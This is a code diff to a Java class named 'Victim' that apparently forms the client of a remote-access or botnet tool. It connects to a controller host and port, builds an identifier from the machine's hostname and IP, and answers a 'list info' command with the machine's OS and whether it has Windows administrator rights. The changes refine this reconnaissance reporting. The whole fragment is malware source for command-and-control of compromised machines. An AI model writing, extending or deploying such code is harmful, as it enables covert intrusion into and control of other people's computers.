@@ -35,7 +35,7 @@ public class Victim implements Runnable {
     private static String OS = System.getProperty("os.name").toLowerCase();
     private static ArrayList users = new ArrayList();
     private static File temp;
-    private static final double version = 0.2;
+    //private static final double version = 0.2;
 
     public static void main(String[] args) throws UnknownHostException, InterruptedException {
 
@@ -53,7 +53,7 @@ public class Victim implements Runnable {
         } catch (Exception e) {
             ip = "noip";
         }
-        whoami = hostname + "@" + ip + " " + "version=" + version + " ";
+        whoami = hostname + "@" + ip + " ";
 
         System.out.println("Connecting to " + host + " on port " + port_number + "...");
 
@@ -156,10 +156,14 @@ public class Victim implements Runnable {
                 }
 
                 if (responseLine.contains("list info")) {
-                    if (isAdmin() == true) {
-                        os.println("online " + whoami + " = " + OS + " admin?= administrator");
-                    } else {
-                        os.println("online " + whoami + " = " + OS + " = admin?= not administrator or linux");
+                    if (OS.contains("windows")) {
+                        if (isAdmin() == true) {
+                            os.println("online " + whoami + " = " + OS + " admin?= administrator");
+                        } else {
+                            os.println("online " + whoami + " = " + OS + " = admin?= not administrator");
+                        }
+                    }else{
+                        os.println("online " + whoami + " = " + OS + " = admin?= ???");
                     }
 
                 }
